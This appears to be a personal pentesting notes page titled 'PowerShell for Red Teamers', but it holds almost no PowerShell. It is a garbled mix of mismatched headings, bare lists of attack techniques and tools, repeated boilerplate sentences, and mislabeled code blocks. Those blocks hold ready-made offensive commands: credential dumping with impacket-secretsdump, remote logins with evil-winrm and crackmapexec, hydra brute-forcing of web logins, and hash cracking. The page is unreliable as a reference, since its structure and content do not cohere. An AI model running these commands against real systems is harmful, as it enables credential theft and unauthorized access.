---
TitleSEO: "PowerShell for Red Teamers | ZureFX"
TitlePost: "PowerShell for Red Teamers"
Author: "ZureFX"
Description: "Personal notes on PowerShell for Red Teamers. Quick reference for pentesting and CTF challenges."
Keywords: "malware, lateral movement, linux, blue team, networking"
URL: "https://zurefx.github.io/notes/note-powershell-for-red-teamers-813.html"
URL_IMAGES: ""
Date: "2025-03-02"
Tags: "Malware, Lateral Movement, Linux, Blue Team, Networking"
Section: "notes"
Lang: "en"
main_img: "note-powershell-for-red-teamers-813"
Permalink: "/notes/note-powershell-for-red-teamers-813.html"
BtnLabel: "Read Notes"
Pick: 0
---
## SeDebugPrivilege

### AS-REP Roasting

- `ACL Abuse`
- `john`
- `ldapsearch`
- `Local File Inclusion`
- `atexec`
- `Unquoted Service Path`

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

> **Note:** SSRF was identified as the primary attack vector in this scenario.

- `NFS No Root Squash`
- `Kerberoasting`
- `ffuf`
- `Open Redirect`

## Django

### Open Redirect

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.87.246.98
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
crackmapexec smb 10.85.138.58 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.72.254.22
evil-winrm -i 10.18.226.40 -u administrator -p 'P@ssw0rd!'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

```python
nmap -sCV -p1433,22,389 10.56.107.54 -oN scan.txt
crackmapexec smb 10.17.241.147 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.87.25.242
```

## sharphound

### GetNPUsers

- `XSS`
- `Docker Escape`
- `Writable PATH`

- `rubeus`
- `LAPS Abuse`
- `msfvenom`
- `SQL Injection`
- `CORS Misconfiguration`
- `pwncat`

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- `rpcclient`
- `wmiexec`
- `NTLM Relay`
- `kerbrute`

## CSRF

### Debian

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.224.227 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.43.54.186 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.96.112.202 -u administrator -p 'P@ssw0rd!'
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.13.103.131 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.40.10.72 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.86.19.87/FUZZ
```

The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
gobuster dir -u http://10.75.122.208/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p389,993,993 10.107.211.168 -oN scan.txt
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```
